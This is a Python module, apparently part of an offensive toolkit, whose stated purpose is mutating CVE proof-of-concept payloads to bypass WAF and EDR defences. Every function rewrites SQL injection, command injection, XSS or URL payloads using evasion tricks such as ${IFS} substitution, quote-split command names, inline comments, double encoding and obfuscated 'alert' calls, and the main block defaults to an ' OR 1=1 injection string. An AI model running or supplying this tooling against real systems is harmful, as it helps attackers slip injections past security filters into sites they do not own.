# core/cve_mutator.py — mutate CVE PoC payloads for WAF/EDR bypass
import urllib.parse
import random
import re


def mutate_url(payload):
    """Mutate URL-encoded payload."""
    out = payload
    # case swap on hex
    if random.random() < 0.5:
        out = re.sub(r'%[0-9a-fA-F]{2}', lambda m: m.group(0).upper() if random.random() < 0.5 else m.group(0).lower(), out)
    # double encode some chars
    if random.random() < 0.5:
        out = out.replace('%', '%25', random.randint(1, 3))
    return out


def mutate_sql(payload):
    """Mutate SQL injection payload."""
    mutations = [
        lambda s: s.replace(" ", "/**/"),
        lambda s: s.replace(" ", "%20"),
        lambda s: s.replace(" ", "%09"),
        lambda s: s.replace(" ", "%0a"),
        lambda s: s.replace("UNION", "UnIoN"),
        lambda s: s.replace("SELECT", "SeLeCt"),
        lambda s: s.replace("OR", "oR"),
        lambda s: s.replace("--", "#"),
        lambda s: s.replace("--", "/*"),
        lambda s: s + " -- -",
        lambda s: s + " #",
        lambda s: s.replace("'", "0x27"),
        lambda s: s.replace('"', "0x22"),
    ]
    return [m(payload) for m in mutations]


def mutate_cmd(payload):
    """Mutate command injection payload."""
    mutations = [
        lambda s: s.replace(" ", "${IFS}"),
        lambda s: s.replace(" ", "$IFS$9"),
        lambda s: s.replace(" ", "%09"),
        lambda s: s.replace("|", "||"),
        lambda s: s.replace(";", ";%0a"),
        lambda s: s.replace("id", "i''d"),
        lambda s: s.replace("cat", "c'a't"),
    ]
    return [m(payload) for m in mutations]


def mutate_xss(payload):
    """Mutate XSS payload."""
    mutations = [
        lambda s: s.replace("<", "%3c"),
        lambda s: s.replace(">", "%3e"),
        lambda s: s.replace("(", "%28"),
        lambda s: s.replace(")", "%29"),
        lambda s: s.replace("script", "scr<script>ipt"),
        lambda s: s.replace("script", "SCRIPT"),
        lambda s: s.replace("alert", "al\\u0065rt"),
        lambda s: s.replace("alert", "eval('ale'+'rt')"),
    ]
    return [m(payload) for m in mutations]


def mutate_generic(payload):
    """Generic payload mutations for any CVE PoC."""
    mutations = [
        lambda s: urllib.parse.quote(s, safe=""),
        lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
        lambda s: s.replace(" ", "%20"),
        lambda s: s.replace(" ", "+"),
        lambda s: s.replace(" ", "%09"),
        lambda s: s.replace(" ", "%0a"),
        lambda s: s.replace("'", "%27"),
        lambda s: s.replace('"', "%22"),
        lambda s: s.replace("<", "%3c").replace(">", "%3e"),
        lambda s: s.upper(),
        lambda s: s.lower(),
    ]
    return [m(payload) for m in mutations]


def mutate(payload, kind=None):
    """
    Generate mutations for a CVE payload.
    kind: 'sql' | 'cmd' | 'xss' | 'url' | None (generic)
    """
    mutations = [payload]
    if kind == "sql":
        mutations.extend(mutate_sql(payload))
    elif kind == "cmd":
        mutations.extend(mutate_cmd(payload))
    elif kind == "xss":
        mutations.extend(mutate_xss(payload))
    elif kind == "url":
        mutations.append(mutate_url(payload))
    else:
        mutations.extend(mutate_generic(payload))
    # dedupe
    return list(dict.fromkeys(mutations))


def mutate_all(payload, max_per_kind=5):
    """All mutation kinds."""
    out = [payload]
    out.extend(mutate_sql(payload)[:max_per_kind])
    out.extend(mutate_cmd(payload)[:max_per_kind])
    out.extend(mutate_xss(payload)[:max_per_kind])
    out.extend(mutate_generic(payload)[:max_per_kind])
    return list(dict.fromkeys(out))


if __name__ == "__main__":
    import sys
    p = sys.argv[1] if len(sys.argv) > 1 else "' OR 1=1-- "
    kind = sys.argv[2] if len(sys.argv) > 2 else None
    for m in mutate(p, kind)[:10]:
        print(f"  {m}")
